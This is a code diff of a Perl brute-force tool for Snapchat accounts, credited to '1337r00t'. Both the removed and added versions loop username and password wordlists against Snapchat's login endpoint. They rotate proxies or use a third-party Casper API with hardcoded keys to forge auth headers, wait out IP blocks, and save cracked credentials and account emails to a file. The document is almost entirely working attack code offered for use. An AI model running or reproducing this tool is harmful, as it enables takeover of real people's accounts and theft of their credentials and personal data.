@@ -1,12 +1,10 @@
-##########################################
-use LWP::UserAgent; # ppm install LWP::UserAgent
-##########################################
+use LWP::UserAgent;
+use JSON::WebToken;
 system('clear');
 system('cls');
-system('color 5');
 print qq(
 ################################
-#      BruteForce Snapchat     #
+# BruteForce SC using (Capser) #
 ################################
 #     Coded By 1337r00t        #
 ################################
@@ -18,36 +16,24 @@ print qq(
 ################################
 Enter [CTRL+C] For Exit :0[w]\nw);
 print qq(
-Bruting :-\n
-1 - Without proxy
-2 - With Proxy but automatically from gimmeproxy
-3 - with proxy [List[Manual]]
->);
-$do = <STDIN>;chomp($do);
-print "\n";
-if ($do == 1){
-	system('clear');
-	system('cls');
-	system('color 5');
-	print qq(
-	Enter Usernames File :
-	> );
-	$usernames=<STDIN>;
-	chomp($usernames);
-	open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
-	@USERS = <USERFILE>;
-	close USERFILE;
-	print qq(
-	Enter Passwords File :
-	> );
-	$passwords=<STDIN>;
-	chomp($passwords);
-	open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
-	@PASSS = <PASSFILE>;
-	close PASSFILE;
-	system('clear');
-	system('cls');
-	print '
+Enter Usernames File :
+> );
+$usernames=<STDIN>;
+chomp($usernames);
+open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
+@USERS = <USERFILE>;
+close USERFILE;
+print qq(
+Enter Passwords File :
+> );
+$passwords=<STDIN>;
+chomp($passwords);
+open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
+@PASSS = <PASSFILE>;
+close PASSFILE;
+system('clear');
+system('cls');
+print '
     _   _____  _____   _____    ____    ___       ___     _____   
    /"| |___"/u|___"/u |___ "|U |  _"\ u/ _"\  u  / _"\  u|_ " _|  
  u | |uU_|_ \/U_|_ \/    / /  \| |_) |/ / U |/  | / U |/   | |    
@@ -56,233 +42,73 @@ if ($do == 1){
  _//<,-,_// \\ _// \\ <<>>_    //   \\_ //        //     _// \\_  
 (__)(_/(__)(__|__)(__|__)__)  (__)  (__|__)      (__)   (__) (__) 
 ';
-	print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
-	######################
-	foreach $username (@USERS) {
-	chomp $username;
-		foreach $password (@PASSS) {
-		chomp $password;
-			$snapchat = LWP::UserAgent->new();
-			$snapchat->default_header('Accept-Language' => "en;q=0.9");
-			$snapchat->default_header('User-Agent' => "Snapchat/8.2.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)");
-			$response = $snapchat->post('https://app.snapchat.com/loq/login',
-				{ 
-				password => $password,
-				req_token => '9300a1585ce1b2f86e0903e7f0a890046eed4d8119e34a8709b4c614d9c5165b',
-				timestamp => '1506271406216',
-				username => $username
-				}
-				);
-			if ($response->content=~ /using a version of Snapchat or operating system/) {
-				print "Cracked -> ($username:$password)\n";
+print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
+######################
+foreach $username (@USERS) {
+chomp $username;
+	foreach $password (@PASSS) {
+	chomp $password;
+		$casper = LWP::UserAgent->new();
+		$jwt = JSON::WebToken->encode({
+		sub => 'Joe',
+		username => $username,
+		password => $password,
+		iat => time,
+		}, 'f3cdf4bbf206f5d572c6db13757c06fe');
+		$casper->default_header('X-Casper-API-Key' => "dd3779d571409a67743c7e0e18a2cc04");
+		$casper->default_header('user-agent' => "Snapchat/10.0 (iPhone7;iOS10.1.1;gzip)");
+		$req_sc = $casper->post('https://casper-api.herokuapp.com/snapchat/ios/login',{ jwt => $jwt });
+		#####################3
+		$snapchat = LWP::UserAgent->new();
+		$snapchat->default_header('Accept-Language' => $req_sc->content=~/"Accept-Language":"(.+?)"/);
+		$snapchat->default_header('Accept-Locale' => $req_sc->content=~/"Accept-Locale":"(.+?)"/);
+		$snapchat->default_header('User-Agent' => $req_sc->content=~/"User-Agent":"(.+?)"/);
+		$snapchat->default_header('X-Snapchat-Client-Auth-Token' => $req_sc->content=~/"X-Snapchat-Client-Auth-Token":"(.+?)"/);
+		$snapchat->default_header('X-Snapchat-Client-Token' => $req_sc->content=~/"X-Snapchat-Client-Token":"(.+?)"/);
+		$snapchat->default_header('X-Snapchat-UUID' => $req_sc->content=~/"X-Snapchat-UUID":"(.+?)"/);
+		$response = $snapchat->post($req_sc->content=~/"url":"(.+?)"/ ,
+			{ 
+			password => $password,
+			req_token => $req_sc->content=~/"req_token":"(.+?)"/,
+			timestamp => $req_sc->content=~/"timestamp":"(.+?)"/,
+			username => $username
+			}
+			);
+		$code = $response->status_line();
+		if($code=~/200/){
+			if($response->content=~/"logged":true/){
+				print "-----\nCracked -> ($username:$password)\nEmail: [ ";
+				print $response->content=~/"email":"(.+?)"/;
+				print " ]\n-----\n";
 				open(R0T,">>Cracked.txt");
-				print R0T "\n($username:$password)\n";
+				print R0T "\n($username:$password:[Email: ";
+				print R0T $response->content=~/"email":"(.+?)"/;
+				print R0T " ])\n";
 				close(R0T);
+				sleep(2)
 			}
 			else
 			{
-				if ($response->content=~ /not the right password./) {
+				if($response->content=~/password is incorrect/){
 					print "Failed -> ($username:$password)\n";
 				}
 				else
 				{
-					if ($response->content=~ /find an account with that username./) {
-						print "NotFound -> ($username)\n";
-					}
-					else
-					{
-						if ($response->content=~ /Invalid account/) {
-							print "Invalid account -> ($username)\n";
-						}
-						else
-						{
-							if ($response->content=~ /Due to repeated failed login attempts or other suspicious activity/) {
-								print "Block bruting only this user -> ($username)\n";
-							}
-							else
-							{
-								print "Blocked Your IP for Requests\n";
-							}
-						}
-					}
+					$response->content();
+					print "\n";
 				}
 			}
 		}
-	}
-}
-if ($do == 2){
-	system('clear');
-	system('cls');
-	system('color 5');
-	print qq(
-	Enter Usernames File :
-	> );
-	$usernames=<STDIN>;
-	chomp($usernames);
-	open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
-	@USERS = <USERFILE>;
-	close USERFILE;
-	print qq(
-	Enter Passwords File :
-	> );
-	$passwords=<STDIN>;
-	chomp($passwords);
-	open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
-	@PASSS = <PASSFILE>;
-	close PASSFILE;
-	system('clear');
-	system('cls');
-	print '
-    _   _____  _____   _____    ____    ___       ___     _____   
-   /"| |___"/u|___"/u |___ "|U |  _"\ u/ _"\  u  / _"\  u|_ " _|  
- u | |uU_|_ \/U_|_ \/    / /  \| |_) |/ / U |/  | / U |/   | |    
-  \| |/ ___) | ___) | u// /\   |  _ < | \// |,-.| \// |,-./| |\   
-   |_| |____/ |____/   /_/ U   |_| \_\ \___/(_/  \___/(_/u |_|U   
- _//<,-,_// \\ _// \\ <<>>_    //   \\_ //        //     _// \\_  
-(__)(_/(__)(__|__)(__|__)__)  (__)  (__|__)      (__)   (__) (__) 
-';
-	print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
-	######################
-	foreach $username (@USERS) {
-	chomp $username;
-		foreach $password (@PASSS) {
-		chomp $password;
-			$prx = LWP::UserAgent->new();
-			$regex = $prx->get('https://gimmeproxy.com/api/getProxy?post=true&protocol=http&websites=google');
-			$snapchat = LWP::UserAgent->new();
-			$snapchat->proxy(['http', 'https'], $prox );
-			$snapchat->default_header('Accept-Language' => "en;q=0.9");
-			$snapchat->default_header('User-Agent' => "Snapchat/8.2.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)");
-			$response = $snapchat->post('https://feelinsonice-hrd.appspot.com/loq/login',
-				{ 
-				password => $password,
-				req_token => '9300a1585ce1b2f86e0903e7f0a890046eed4d8119e34a8709b4c614d9c5165b',
-				timestamp => '1506271406216',
-				username => $username
-				}
-				);
-			if ($response->content=~ /using a version of Snapchat or operating system/) {
-				print "Cracked -> ($username:$password)\n";
-				open(R0T,">>Cracked.txt");
-				print R0T "\n($username:$password)\n";
-				close(R0T);
-			}
-			else
-			{
-				if ($response->content=~ /not the right password./) {
-					print "Failed -> ($username:$password)\n";
-				}
-				else
-				{
-					if ($response->content=~ /find an account with that username./) {
-						print "NotFound -> ($username)\n";
-					}
-					else
-					{
-						if ($response->content=~ /Invalid account/) {
-							print "Invalid account -> ($username)\n";
-						}
-						else
-						{
-							if ($response->content=~ /Due to repeated failed login attempts or other suspicious activity/) {
-								print "Block bruting only this user -> ($username)\n";
-							}
-							else
-							{
-								print "----------------\n";
-								print "Blocked :(\n";
-								print "But now check this proxy [";
-								print $regex->content=~/"curl": "(.+?)"/;
-								print "] if works or not :)\n";
-								print "Just Wait ...\n";
-								print "----------------\n";
-								sleep(11);
-							}
-						}
-					}
-				}
-			}
+		else
+		{
+			print "\tSorry, your ip [Blocked]\nwait to bypass blocked !... \n";
+			sleep(18);
 		}
 	}
 }
-if ($do == 3){
-	system('clear');
-	system('cls');
-	system('color 5');
-	print "List Of Proxys => ";
-	$proxys=<STDIN>;
-	chomp($proxys);
-	open (PROXYFILE, "<$proxys") || die "[-] Can't Found ($proxys) !";
-	@PROXYS = <PROXYFILE>;	
-	close PROXYFILE;
-	print '
-    _   _____  _____   _____    ____    ___       ___     _____   
-   /"| |___"/u|___"/u |___ "|U |  _"\ u/ _"\  u  / _"\  u|_ " _|  
- u | |uU_|_ \/U_|_ \/    / /  \| |_) |/ / U |/  | / U |/   | |    
-  \| |/ ___) | ___) | u// /\   |  _ < | \// |,-.| \// |,-./| |\   
-   |_| |____/ |____/   /_/ U   |_| \_\ \___/(_/  \___/(_/u |_|U   
- _//<,-,_// \\ _// \\ <<>>_    //   \\_ //        //     _// \\_  
-(__)(_/(__)(__|__)(__|__)__)  (__)  (__|__)      (__)   (__) (__) 
-';
-	print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nProxys:$proxys\n--------\nCracking Now !..\n";
-	foreach $prox (@PROXYS) {
-	chomp $prox;
-		foreach $username (@USERS) {
-		chomp $username;
-			foreach $password (@PASSS) {
-			chomp $password;
-				$prx = LWP::UserAgent->new();
-				$regex = $prx->get('https://gimmeproxy.com/api/getProxy?post=true&protocol=http&websites=google');
-				$snapchat = LWP::UserAgent->new();
-				$snapchat->proxy(['http', 'https'], $prox );
-				$snapchat->default_header('Accept-Language' => "en;q=0.9");
-				$snapchat->default_header('User-Agent' => "Snapchat/8.2.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)");
-				$response = $snapchat->post('https://feelinsonice-hrd.appspot.com/loq/login',
-					{ 
-					password => $password,
-					req_token => '9300a1585ce1b2f86e0903e7f0a890046eed4d8119e34a8709b4c614d9c5165b',
-					timestamp => '1506271406216',
-					username => $username
-					}
-					);
-				if ($response->content=~ /using a version of Snapchat or operating system/) {
-					print "Cracked -> ($username:$password)\n";
-					open(R0T,">>Cracked.txt");
-					print R0T "\n($username:$password)\n";
-					close(R0T);
-				}
-				else
-				{
-					if ($response->content=~ /not the right password./) {
-						print "Failed -> ($username:$password)\n";
-					}
-					else
-					{
-						if ($response->content=~ /find an account with that username./) {
-							print "NotFound -> ($username)\n";
-						}
-						else
-						{
-							if ($response->content=~ /Invalid account/) {
-								print "Invalid account -> ($username)\n";
-							}
-							else
-							{
-								if ($response->content=~ /Due to repeated failed login attempts or other suspicious activity/) {
-									print "Block bruting only this user -> ($username)\n";
-								}
-								else
-								{
-									print "----------------\n";
-									print "Blocked Request [$prox]:(\n";
-									print "----------------\n";
-									sleep(11);
-								}
-							}
-						}
-					}
-				}
-			}
-		}
-	}
-}
+########################################################
+#
+# Follw Me :-
+# Twitter: @_1337r00t
+#
+########################################################
